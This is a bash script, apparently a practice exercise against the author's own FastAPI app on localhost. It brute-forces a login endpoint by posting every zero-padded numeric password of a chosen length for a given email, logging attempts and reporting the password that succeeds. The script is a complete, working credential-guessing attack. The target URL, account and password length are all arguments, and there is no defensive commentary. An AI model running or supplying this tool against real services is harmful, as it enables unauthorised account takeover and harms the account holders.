#!/bin/bash
set -u

URL="${1:-http://127.0.0.1:8000/login}"
USER="${2:-nicolas@gmail.com}"
PASSWORD_LENGTH="${3:-4}"
LOGFILE="attack_log.txt"
MAX_POSSIBLE=$((10**PASSWORD_LENGTH))

echo "=== My bruteforce a la API FastAPI ===" > "$LOGFILE"
echo "Objetivo: $URL" | tee -a "$LOGFILE"
echo "Email: $USER" | tee -a "$LOGFILE"
echo "Longitud: $PASSWORD_LENGTH dígitos" | tee -a "$LOGFILE"
echo "Total combinaciones: $MAX_POSSIBLE" | tee -a "$LOGFILE"
echo "Inicio: $(date)" | tee -a "$LOGFILE"

attempts=0
start_time=$(date +%s)
found_pw=""
successful_login=false

generate_and_try() {
    local length=$1
    local max=$((10**length - 1))
    
    for i in $(seq -w 0 $max); do
        pw=$(printf "%0${length}d" $i)
        ((attempts++))
        
        if [[ $((attempts % 100)) -eq 0 ]]; then
            echo "Progreso medido: $attempts/$MAX_POSSIBLE intentos" | tee -a "$LOGFILE"
        fi
        
        json_data=$(printf '{"email":"%s","password":"%s"}' "$USER" "$pw")
        
        resp_and_code=$(curl -s -S -m 5 -X POST "$URL" \
            -H "Content-Type: application/json" \
            -d "$json_data" \
            -w "||%{http_code}" 2>/dev/null) || {
            echo "Hubo un error en el request" | tee -a "$LOGFILE"
            continue
        }
        
        http_code="${resp_and_code##*||}"
        body="${resp_and_code%||*}"
        
        echo "No de Intento #$attempts: $pw -> HTTP $http_code" >> "$LOGFILE"
        
        if [[ "$http_code" == "200" ]] && [[ "$body" == *"Login conseguido"* ]]; then
            found_pw="$pw"
            elapsed=$(( $(date +%s) - start_time ))
            echo ">>> ¡CONTRASEÑA CONSEGUIDA! $found_pw (intentos=$attempts, tiempo=${elapsed}s)" | tee -a "$LOGFILE"
            echo "Respuesta completa: $body" | tee -a "$LOGFILE"
            successful_login=true
            return 0
        fi
        
        sleep 0.1
    done
    return 1
}

generate_and_try "$PASSWORD_LENGTH"

total_time=$(( $(date +%s) - start_time ))

if [[ "$successful_login" == true ]]; then
    echo "Resultado: Login con contraseña: $found_pw" | tee -a "$LOGFILE"
else
    echo "Resultado: Contraseña no descubierta (intentos=$attempts)" | tee -a "$LOGFILE"
fi

echo "Tiempo total: ${total_time}s" | tee -a "$LOGFILE"
echo "Fin: $(date)" | tee -a "$LOGFILE"
echo "Se ha guardado el log en: $LOGFILE"

if [[ "$successful_login" == true ]]; then
    echo "Contraseña encontrada: $found_pw"
else
    echo "No se encontró la contraseña."
fi
